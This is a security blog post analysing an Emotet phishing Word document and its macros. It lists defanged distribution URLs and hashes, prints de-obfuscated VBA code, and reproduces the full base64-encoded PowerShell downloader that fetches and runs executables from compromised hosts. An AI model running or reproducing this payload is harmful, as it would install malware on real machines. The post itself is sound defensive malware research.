<!DOCTYPE html>
    <head>
        <!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-72526364-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'UA-72526364-1');
        </script>
        <meta charset="utf-8"/>
        <meta http-equiv="content-language" content="en"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <meta name="google-site-verification" content="J_8Q0-xJba2mH3qk5DYZVANicD-89wVM1SBFiRTTqFs" />

        <!-- Collect all tags -->
        
            





        
        <!-- Collect all tags -->
        <link rel="stylesheet" href="https://persianov.net/css/monokai.css">
        <link rel="stylesheet" href="https://persianov.net/css/styles.css">
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="manifest" href="/site.webmanifest">
        <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#004917">
        <link rel="alternate" type="application/atom+xml" title="Persianov on Security" href="/feed.xml">
        <meta name="msapplication-TileColor" content="#2b5797">
        <meta name="theme-color" content="#ffffff">
        <title>Persianov on Security: Emotet malware analysis. Part 1.</title>
        <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Emotet malware analysis. Part 1. | Persianov on Security</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="Emotet malware analysis. Part 1." />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Analyzing Emotet malware, a trojan that is spread via phishing emails, malicious links and targets individuals, companies and governments." />
<meta property="og:description" content="Analyzing Emotet malware, a trojan that is spread via phishing emails, malicious links and targets individuals, companies and governments." />
<link rel="canonical" href="https://persianov.net/emotet-malware-analysis-part-1" />
<meta property="og:url" content="https://persianov.net/emotet-malware-analysis-part-1" />
<meta property="og:site_name" content="Persianov on Security" />
<meta property="og:image" content="https://persianov.net/img/emotet_malware/emotet-malware.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-03-17T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://persianov.net/img/emotet_malware/emotet-malware.jpg" />
<meta property="twitter:title" content="Emotet malware analysis. Part 1." />
<meta name="twitter:site" content="@s_persianov" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2019-03-17T00:00:00+00:00","datePublished":"2019-03-17T00:00:00+00:00","description":"Analyzing Emotet malware, a trojan that is spread via phishing emails, malicious links and targets individuals, companies and governments.","headline":"Emotet malware analysis. Part 1.","image":"https://persianov.net/img/emotet_malware/emotet-malware.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"https://persianov.net/emotet-malware-analysis-part-1"},"url":"https://persianov.net/emotet-malware-analysis-part-1"}</script>
<!-- End Jekyll SEO tag -->

    </head>
<body>
    <img class="header_image" src="/img/header.png" alt="Persianov on Security"/>

    <div class="top_nav">
        <a href="/"><span class="red" title="Blog posts">[</span>Blog<span class="red">]</span></a>
        <a href="#projects"><span class="red" title="Projects list">[</span>Projects<span class="red">]</span></a>
        <a href="#bugtrack"><span class="red" title="Found and reported bugs">[</span>Bugtrack<span class="red">]</span></a>
        <a href="/challenges.html" title="Challenges and crackme repository"><span class="red">[</span>Challenges<span class="red">]</span></a>
        <a href="/contact-me.html"><span class="red" title="Contact me">[</span>Contact<span class="red">]</span></a>
        <a href="/feed.xml"><span class="red" title="RSS Feed">[</span>RSS<span class="red">]</span></a>
    </div>
    
    <article class="resp_w" >
    <div>
        <h1 class="post_title center">
            <span class="green">[</span>
            Emotet malware analysis. Part 1.
            <span class="green">]</span>
        </h1>
        <p class="post_meta green-dark center">
            === Mar 17, 2019 ===
        </p>
    </div>    
    <p>This is Part 1 of Emotet malware analysis I’m planning to post. It covers phases 1 and 2 of the attack, specifically phishing and establishing persistence in the infected system. Emotet is spread via phishing emails containing malicious links or attachments, and targets everyone (individuals, companies and governments).</p>

<h2 id="phase-1-malicious-email-and-document">Phase 1. Malicious email and document.</h2>

<p>First phase of the attack starts with a Phishing email. Usually subject, layout, attachments and links are modified periodically by attackers. In this article I’m going to analyze <a href="https://www.virustotal.com/#/file/f5e9c63713c7ff968f4958a9b5161e78af05f21493e56555734b89f55b2be24c/detection" title="Emotet's attachment sample">this sample from VirusTotal</a>.</p>

<p><a href="../img/emotet_malware/virustotal_sample.jpg"> <img src="/img/emotet_malware/virustotal_sample.jpg" alt="VirusTotal Sample" class="post_image" /> </a></p>

<p>One of Emotet’s characteristics is constantly changing content of the phishing emails. Usually these contain a malicious link or attachment. This article covers the sample which was spread using via following links:</p>

<table>
  <thead>
    <tr>
      <th>URL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>hxxps://www.tenderheartfoundation.org/knqimf/muwcu-xh8fa-vnewt/</td>
    </tr>
    <tr>
      <td>hxxp://clyckmedia.com/clientes/ylhq8-zg1ue-iibdnyco/</td>
    </tr>
    <tr>
      <td>hxxp://noithathopehome.com/8brl9if/hldd-m2v2fy-xavkpbbl/</td>
    </tr>
    <tr>
      <td>hxxp://cllcanada.ca/2010/lmef-jmlr1n-ftkktgp/</td>
    </tr>
    <tr>
      <td>hxxp://www.smilefy.com/it3fqqo/rnk6-9mm14-fcnp.view/</td>
    </tr>
    <tr>
      <td>hxxp://cadsupportplus.com/assets/nwi2z-20bew-ffuwbfmt/</td>
    </tr>
    <tr>
      <td>hxxp://www.sdhjesov.cz/wordpress/papcc-koe6n-lsric.view/</td>
    </tr>
    <tr>
      <td>hxxp://bigkidneys.com/42QQXOURJ/gf1lm-hmr0c-lnkcfak/</td>
    </tr>
    <tr>
      <td>hxxp://compraventachocados.cl/css/hgkhx-lin1b-zjkebwycv/</td>
    </tr>
    <tr>
      <td>hxxp://cruelacid.com/icon/bmza-8dlyf-jemlc/</td>
    </tr>
    <tr>
      <td>hxxp://ecommercedefinitivo.com.br/cursos/ryyjt-tnxm7-byxukc/</td>
    </tr>
    <tr>
      <td>hxxp://annual.fph.tu.ac.th/wp-content/uploads/ikvv-lt7rlt-bqcnmly/</td>
    </tr>
    <tr>
      <td>hxxp://dbtools.com.br/mailer/ezsvr-mqo7i-zgysfrmwr/</td>
    </tr>
    <tr>
      <td>hxxp://demu.hu/wp-content/2h2z2-errsh-sxwqgscp/</td>
    </tr>
    <tr>
      <td>hxxp://georgekiser.com/test/z6uwt-r0459s-rqkv.view/</td>
    </tr>
    <tr>
      <td>hxxp://wdl.usc.edu/wp-includes/zvlp-s69lox-wrkbb.view/</td>
    </tr>
    <tr>
      <td>hxxp://dictionary.me/js/bbrj3-tq4eh-izxcuhnb/</td>
    </tr>
    <tr>
      <td>hxxp://duncaninstallation.com/images/u32g-mdxys3-gjcwkz/</td>
    </tr>
    <tr>
      <td>hxxp://devpro.ro/misc/3wa1-zykhgf-xcjqnfs/</td>
    </tr>
  </tbody>
</table>

<p>All URLs above, once accessed, drop a Microsoft Office Document with macros in it.</p>

<table>
  <thead>
    <tr>
      <th>Checksum</th>
      <th>File type</th>
      <th>File Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>f5e9c63713c7ff968f4958a9b5161e78af05f21493e56555734b89f55b2be24c</td>
      <td>MS Word Document</td>
      <td>246KB (251904 bytes)</td>
    </tr>
  </tbody>
</table>

<script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5423038656551173" crossorigin="anonymous"></script>

<p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-5423038656551173" data-ad-slot="9543159315"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></p>

<h3 id="analysis">Analysis.</h3>

<p>Based on the result we get by running <code class="language-plaintext highlighter-rouge">file</code> command against this sample, it looks like this document has 1 page and doesn’t contain any words.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f5e9c63713c7ff968f4958a9b5161e78af05f21493e56555734b89f55b2be24c: Composite Document File V2 Document, Little Endian, 
Os: Windows, Version 6.1, Code page: 1252, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, 
Create Time/Date: Mon Mar 11 21:32:00 2019, Last Saved Time/Date: Mon Mar 11 21:32:00 2019, Number of Pages: 1, 
Number of Words: 0, Number of Characters: 5, Security: 0
</code></pre></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">Oletools</code> to get the list of document’s objects, 3 macros elements have been found:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  7:        74 <span class="s1">'Macros/PROJECTwm'</span>
  8: M   70540 <span class="s1">'Macros/VBA/S1ADDQ1A'</span>
  9: M   14650 <span class="s1">'Macros/VBA/YBB1wA'</span>
 10:     49987 <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>
 11:      1344 <span class="s1">'Macros/VBA/__SRP_0'</span>
 12:       110 <span class="s1">'Macros/VBA/__SRP_1'</span>
 13:       436 <span class="s1">'Macros/VBA/__SRP_2'</span>
 14:       187 <span class="s1">'Macros/VBA/__SRP_3'</span>
 15:       601 <span class="s1">'Macros/VBA/dir'</span>
 16: M    9719 <span class="s1">'Macros/VBA/mA4QAX4'</span>
 17:      4096 <span class="s1">'WordDocument'</span>
</code></pre></div></div>

<h3 id="extraction">Extraction.</h3>

<p>Objects 8, 9 and 16 contain Visual Basic code, thus of higher interest for further analysis.</p>

<table>
  <thead>
    <tr>
      <th>Object</th>
      <th>Name</th>
      <th>Checksum</th>
      <th>Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>8</td>
      <td>S1ADDQ1A</td>
      <td>34ffc69ff37401b965b04fa4f3c1fbcdffab11fd2e34f9e17a8347b70922398b</td>
      <td>44KB (44096 bytes)</td>
    </tr>
    <tr>
      <td>9</td>
      <td>YBB1wA</td>
      <td>d51c137e3f591a275628e697d2fbb305cc3c630455480508184b45753608d973</td>
      <td>8.8KB (8956 bytes)</td>
    </tr>
    <tr>
      <td>16</td>
      <td>mA4QAX4</td>
      <td>d2e56d56ced7ed8de5f701a873086c8134e1311dd574a607a45023f38d5ecaf7</td>
      <td>5.6KB (5671 bytes)</td>
    </tr>
  </tbody>
</table>

<p>Out of all extracted parts of the script, <code class="language-plaintext highlighter-rouge">mA4QAX4</code> is the <em>entry point</em> and starts the execution once the document is opened. Whole VBS code is obfuscated, as seen in the image below.</p>

<p><a href="../img/emotet_malware/macros_entry.png"> <img src="/img/emotet_malware/macros_entry.png" alt="Macros Entry Point" class="post_image" /> </a></p>

<script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5423038656551173" crossorigin="anonymous"></script>

<p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-5423038656551173" data-ad-slot="5911089967"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></p>

<p>All three parts are dependent on each other and have to be merged, for further analysis. You can find it <a href="https://www.virustotal.com/gui/file/50536aaf9cc87b6cf5b3fcd1ef5c11f348737ef28f220872bcbdfb56813c68bc/detection" title="Merged version">HERE</a>.</p>

<p>The call chain looks like this:</p>

<ol>
  <li>autoopen();</li>
  <li>iQwUcAAU(param):
    <ul>
      <li>Creates <strong>Win32_ProcessStartup</strong> class;</li>
      <li>Creates an object of the class by calling <strong>Create</strong> method;</li>
      <li>Passes <em>param</em> string as command argument, thus starting the execution;</li>
    </ul>
  </li>
</ol>

<p>Value of <em>param</em> consists of concatenated results of following functions: <code class="language-plaintext highlighter-rouge">SQoBUAA</code>, <code class="language-plaintext highlighter-rouge">vDXBUQ</code>, <code class="language-plaintext highlighter-rouge">rDCAQQcA</code>, <code class="language-plaintext highlighter-rouge">pAADAADD</code>, <code class="language-plaintext highlighter-rouge">k1kGUAB</code>, <code class="language-plaintext highlighter-rouge">cAABQDw</code>. All these functions are similar in terms of logic and were easy to de-obfuscate. Below is the <em>clean</em> version of <code class="language-plaintext highlighter-rouge">SQoBUAA</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Function SQoBUAA<span class="o">()</span>
On Error Resume Next
jkQBUx <span class="o">=</span> <span class="s2">"l -"</span> + <span class="s2">"nop"</span> + <span class="s2">" -e"</span> + <span class="s2">"n"</span> + <span class="s2">"c"</span> + <span class="s2">" JA"</span> + <span class="s2">"BHA"</span> + <span class="s2">"G"</span> + <span class="s2">"8Aa"</span> + <span class="s2">"wB"</span> + <span class="s2">"HA"</span> + <span class="s2">"E"</span> + <span class="s2">"M"</span> + <span class="s2">"AN"</span> + <span class="s2">"A"</span> + <span class="s2">"B"</span> + <span class="s2">"B"</span> + <span class="s2">"A"</span> + <span class="s2">"D"</span> + <span class="s2">"QA"</span> + <span class="s2">"PQ"</span> + <span class="s2">"A"</span> + <span class="s2">"oAC"</span>
lBADQoU <span class="o">=</span> <span class="s2">"cAe"</span> + <span class="s2">"gBf"</span> + <span class="s2">"AC"</span> + <span class="s2">"cAK"</span> + <span class="s2">"w"</span> + <span class="s2">"An"</span> + <span class="s2">"AEE"</span> + <span class="s2">"AWg"</span> + <span class="s2">"AnA"</span> + <span class="s2">"CsA"</span> + <span class="s2">"Jw"</span> + <span class="s2">"Br"</span> + <span class="s2">"A"</span> + <span class="s2">"G8A"</span> + <span class="s2">"RAB"</span>
tcoAAAAQ <span class="o">=</span> <span class="s2">"B"</span> + <span class="s2">"ACc"</span> + <span class="s2">"A"</span> + <span class="s2">"K"</span> + <span class="s2">"Q"</span> + <span class="s2">"A7A"</span> + <span class="s2">"CQ"</span> + <span class="s2">"AU"</span> + <span class="s2">"gBf"</span> + <span class="s2">"AEE"</span> + <span class="s2">"A"</span> + <span class="s2">"a"</span> + <span class="s2">"w"</span> + <span class="s2">"AxA"</span> + <span class="s2">"F8"</span>
HAQUxA_ <span class="o">=</span> <span class="s2">"AQQ"</span> + <span class="s2">"BBA"</span> + <span class="s2">"D0"</span> + <span class="s2">"Abg"</span> + <span class="s2">"BlA"</span> + <span class="s2">"Hc"</span> + <span class="s2">"ALQ"</span> + <span class="s2">"BvA"</span> + <span class="s2">"GI"</span> + <span class="s2">"Aa"</span> + <span class="s2">"gBl"</span> + <span class="s2">"AG"</span> + <span class="s2">"MAd"</span> + <span class="s2">"A"</span> + <span class="s2">"AgA"</span> + <span class="s2">"E"</span> + <span class="s2">"4"</span> + <span class="s2">"A"</span> + <span class="s2">"Z"</span> + <span class="s2">"QB0"</span> + <span class="s2">"A"</span> + <span class="s2">"C"</span> + <span class="s2">"4A"</span> + <span class="s2">"VwB"</span> + <span class="s2">"lAG"</span>
tUQokAA <span class="o">=</span> <span class="s2">"IA"</span> + <span class="s2">"Qw"</span> + <span class="s2">"Bs"</span> + <span class="s2">"AGk"</span> + <span class="s2">"AZQ"</span> + <span class="s2">"Bu"</span> + <span class="s2">"AH"</span> + <span class="s2">"Q"</span> + <span class="s2">"A"</span> + <span class="s2">"O"</span> + <span class="s2">"wA"</span> + <span class="s2">"kAG"</span> + <span class="s2">"k"</span> + <span class="s2">"AVQ"</span> + <span class="s2">"Bv"</span> + <span class="s2">"AF"</span> + <span class="s2">"8AR"</span> + <span class="s2">"ABB"</span> + <span class="s2">"AD"</span> + <span class="s2">"0"</span> + <span class="s2">"AK"</span> + <span class="s2">"AA"</span> + <span class="s2">"n"</span> + <span class="s2">"A"</span> + <span class="s2">"GgA"</span>
cUAAoX <span class="o">=</span> <span class="s2">"d"</span> + <span class="s2">"AAn"</span> + <span class="s2">"ACs"</span> + <span class="s2">"AJw"</span> + <span class="s2">"B0"</span> + <span class="s2">"AH"</span> + <span class="s2">"A"</span> + <span class="s2">"AOg"</span> + <span class="s2">"A"</span> + <span class="s2">"vA"</span> + <span class="s2">"C8A"</span> + <span class="s2">"Yg"</span> + <span class="s2">"B"</span> + <span class="s2">"pA"</span> + <span class="s2">"G"</span> + <span class="s2">"U"</span> + <span class="s2">"A"</span> + <span class="s2">"ZAB"</span> + <span class="s2">"l"</span> + <span class="s2">"A"</span> + <span class="s2">"H"</span> + <span class="s2">"I"</span> + <span class="s2">"A"</span> + <span class="s2">"bQ"</span> + <span class="s2">"Bh"</span>
AkQG_A <span class="o">=</span> <span class="s2">"A"</span> + <span class="s2">"Cc"</span> + <span class="s2">"AKw"</span> + <span class="s2">"An"</span> + <span class="s2">"AG"</span> + <span class="s2">"4AL"</span> + <span class="s2">"g"</span> + <span class="s2">"B"</span> + <span class="s2">"uAG"</span> + <span class="s2">"UAd"</span> + <span class="s2">"AA"</span> + <span class="s2">"vAG"</span> + <span class="s2">"wA"</span> + <span class="s2">"ZQB"</span> + <span class="s2">"zAG"</span> + <span class="s2">"wA"</span> + <span class="s2">"a"</span> + <span class="s2">"QBl"</span>
SQoBUAA <span class="o">=</span> jkQBUx + lBADQoU + tcoAAAAQ + HAQUxA_ + tUQokAA + cUAAoX + AkQG_A
End Function
</code></pre></div></div>

<h2 id="phase-2-persistent-powershell">Phase 2. Persistent Powershell.</h2>

<p>A base64 encoded powershell script is extracted and set to run at system’s startup, by the document macros.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">JABHAG8AawBHAEMANABBADQAPQAoACcAegBfACcAKwAnAEEAWgAnACsAJwBrAG8ARABBACcA</span><span class="w">
</span><span class="n">KQA7ACQAUgBfAEEAawAxAF8AQQBBAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGkAVQBvAF8ARABBAD0AKAA</span><span class="w">
</span><span class="nx">nAGgAdAAnACsAJwB0AHAAOgAvAC8AYgBpAGUAZABlAHIAbQBhACcAKwAnAG4ALgBuAGUAdAAvAGwAZQBzAGwAaQBlAC8AbAAnACsAJwBMAC8AJwArACcAQABoAH</span><span class="w">
</span><span class="n">QAdABwADoALwAnACsAJwAvAG4AaQBzAHMAYQAnACsAJwBuAGIAYQAnACsAJwBjAGcAaQBhACcAKwAnAG4AZwAnACsAJwAuAGMAJwArACcAbwBtAC8AdwBwAC0AY</span><span class="w">
</span><span class="nx">wBvACcAKwAnAG4AdABlAG4AdAAnACsAJwAvAHgAUgAnACsAJwAzAC8AJwArACcAQAAnACsAJwBoAHQAdAAnACsAJwBwADoALwAnACsAJwAvAGUAcQB1AGkAZABh</span><span class="w">
</span><span class="n">AGQAZABlAGcAZQBuAGUAcgAnACsAJwBvAC4AJwArACcAaQB6AHQAJwArACcAYQBjAGEAbABhAC4AdQAnACsAJwBuAGEAbQAuAG0AeAAvACcAKwAnAHcAcAAtAGE</span><span class="w">
</span><span class="nx">AZABtAGkAbgAvACcAKwAnAFgAUABGAC8AQABoAHQAdABwADoALwAvAHcAdwB3AC4AJwArACcAegAnACsAJwBlAHMAdABlAHYAZQBuAHQAJwArACcAcwAuAGMAbw</span><span class="w">
</span><span class="n">AvAHcAcAAtACcAKwAnAGkAJwArACcAbgBjAGwAdQBkAGUAcwAvAEcAJwArACcASgBBACcAKwAnAG8ALwBAAGgAdAB0AHAAJwArACcAOgAvAC8AJwArACcAcwB0A</span><span class="w">
</span><span class="nx">HkAJwArACcAbABpACcAKwAnAHMAaABsAGEAYgAuAHcAZQBiAHAAaQB4AGEAYgB5AHQAJwArACcAZQAnACsAJwAuAGMAJwArACcAbwBtAC8AdAAnACsAJwBoAGoA</span><span class="w">
</span><span class="n">bwB3AHIAawA1ACcAKwAnAGUALwA5AFUARwAvACcAKQAuAFMAcABsAGkAdAAoACcAQAAnACkAOwAkAHYAWgBBAEEAQgA0AD0AKAAnAFEAQwBBAEIAJwArACcAQgB</span><span class="w">
</span><span class="nx">BAFUAJwApADsAJABKAFUAQQBrAEEAQQAgAD0AIAAoACcANAA4ACcAKwAnADYAJwApADsAJABGAGsAWgBBAEQAWgBVAD0AKAAnAGoAJwArACcANABfAEEAQQBCAE</span><span class="w">
</span><span class="n">EAJwApADsAJABtAFEAVQBrAHcARwA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQASgBVAEEAawBBAEEAKwAoACcALgBlACcAK</span><span class="w">
</span><span class="nx">wAnAHgAZQAnACkAOwBmAG8AcgBlAGEAYwBoACgAJAByAEIAQQBCAEQAbwAgAGkAbgAgACQAaQBVAG8AXwBEAEEAKQB7AHQAcgB5AHsAJABSAF8AQQBrADEAXwBB</span><span class="w">
</span><span class="n">AEEALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAcgBCAEEAQgBEAG8ALAAgACQAbQBRAFUAawB3AEcAKQA7ACQAQwBYAGsAQQBBADQAQQA9ACgAJwBWADQ</span><span class="w">
</span><span class="nx">AQgBBACcAKwAnAEEAawBBACcAKQA7AEkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAG0AUQBVAGsAdwBHACkALgBsAGUAbgBnAHQAaAAgAC0AZwBlACAANA</span><span class="w">
</span><span class="n">AwADAAMAAwACkAIAB7AEkAbgB2AG8AawBlAC0ASQB0AGUAbQAgACQAbQBRAFUAawB3AEcAOwAkAG4ARABBAEEAdwBvAFgAPQAoACcAcwAnACsAJwBvAEEAeABBA</span><span class="w">
</span><span class="nx">EQAJwApADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAGMAdwBRAEEAQQBRAHgAPQAoACcARQBCAG8AYwAnACsAJwBBAEEAJwApADsA</span><span class="w">
</span></code></pre></div></div>
<p>Once decoded, several URLs pop up which drop phase 3 PE files.</p>

<p><a href="../img/emotet_malware/powershell_decoded.png"> <img src="/img/emotet_malware/powershell_decoded.png" alt="Decoded powershell" class="post_image" /> </a></p>

<script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5423038656551173" crossorigin="anonymous"></script>

<p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-5423038656551173" data-ad-slot="9543159315"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></p>

<p>Totally there are 5 different websites, hosting Emotet malware.</p>

<table>
  <thead>
    <tr>
      <th>URL</th>
      <th>Dropped PE Checksum</th>
      <th>Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>hxxp://biederman.net/leslie/lL/</td>
      <td>e76900b9b50306564c415423e0eb28463722b0427186134ba301209b4ed2f440</td>
      <td>180KB (183560 bytes)</td>
    </tr>
    <tr>
      <td>hxxp://nissanbacgiang.com/wp-content/xR3/</td>
      <td>5c2fbc0eaae6ccc8342c22325f0aca1e989beec8d578e3fe57722b807a46c773</td>
      <td>180KB (183560 bytes)</td>
    </tr>
    <tr>
      <td>hxxp://equidaddegenero.iztacala.unam.mx/wp-admin/XPF/</td>
      <td>bc0d53d74f3f4ef286b4f4caeb8d8b77e32cc17b808dd0de5674842ad713dd72</td>
      <td>180KB (183560 bytes)</td>
    </tr>
    <tr>
      <td>hxxp://stylishlab.webpixabyte.com/thjowrk5e/9UG/</td>
      <td>1c06da405051cfc9f68dbb404e338abb90a38db29f86f17e01487ac2c921c05d</td>
      <td>251KB (256264 bytes)</td>
    </tr>
    <tr>
      <td>hxxp://www.zestevents.co/wp-includes/GJAo/</td>
      <td>403 HTTP Error</td>
      <td>N/A</td>
    </tr>
  </tbody>
</table>

<h2 id="conclusion">Conclusion.</h2>

<p>Looks like the group behind Emotet, haven’t focused on heavily obfuscating phase 1 and 2 scripts. Analysis of downloaded samples to follow in Part 2 of this article.</p>

    <br><br>
    
<div id="share-bar">
    <fieldset style="border: 1px solid #c5c4c4; padding: 18px;">
        <legend style="font-size: 17px;">Liked it? Share it:</legend>

        <div class="share-buttons">
            <a  href="https://twitter.com/intent/tweet?text=Emotet malware analysis. Part 1.&url=https://persianov.net/emotet-malware-analysis-part-1"
                onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
                title="Share on Twitter" >
                <span class="fa-twitter share-button">[ twitter ]</span>
            </a>

            <a  href="http://www.reddit.com/submit?url=https://persianov.net/emotet-malware-analysis-part-1"
                onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;"
                title="Share on Reddit" >
                <span class="fa-reddit share-button">[ reddit ]</span>
            </a>

            <a  href="https://www.linkedin.com/shareArticle?mini=true&url=https://persianov.net/emotet-malware-analysis-part-1&title=Emotet malware analysis. Part 1.&summary=Analyzing Emotet malware, a trojan that is spread via phishing emails, malicious links and targets individuals, companies and governments.&source=Persianov on Security"
                onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
                title="Share on LinkedIn" >
                <span class="fa-linkedin share-button">[ linkedin ]</span>
            </a>

            <a  href="https://www.facebook.com/sharer/sharer.php?u=https://persianov.net/emotet-malware-analysis-part-1"
                onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
                title="Share on Facebook" >
                <span class="fa-facebook share-button">[ facebook ]</span>
            </a>

            <a href="/cdn-cgi/l/email-protection#0f307c7a6d656a6c7b324a62607b6a7b2f626e63786e7d6a2f6e616e63767c667c212f5f6e7d7b2f3e21296e627f346d606b76324c676a6c642f607a7b2f7b67667c2f7c667b6a2f677b7b7f7c3520207f6a7d7c666e61607921616a7b206a62607b6a7b22626e63786e7d6a226e616e63767c667c227f6e7d7b223e" title="Share via Email">
                <span class="fa-envelope share-button">[ email ]</span>
            </a>
        </div>
    </fieldset>
</div>


</article>

    <footer class="center">
        <div>
            <p><strong>Copyright &copy; Sveatoslav Persianov</strong></p>
            <p>Find me on: 
                <a href="https://twitter.com/s_persianov" title="Follow me on Twitter">Twitter</a>
                <a href="https://github.com/num1r0" title="Check my GitHub repository">GitHub</a>
                <a href="https://www.linkedin.com/in/sveatoslav-persianov/" title="Find me on LinkedIn">LinkedIn</a>
                <a href="https://www.youtube.com/channel/UCn9NOhHKQMM_M_RFLc7ztMg" title="Follow me on YouTube">YouTube</a>
                <a href="/contact-me.html" title="Contact me by email">Email</a>
            </p>
            <p><a href="https://persianov.net/privacy-cookies-policy.html">Privacy Policy and Cookies Policy</a></p>
        </div>
    </footer>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>

</html>
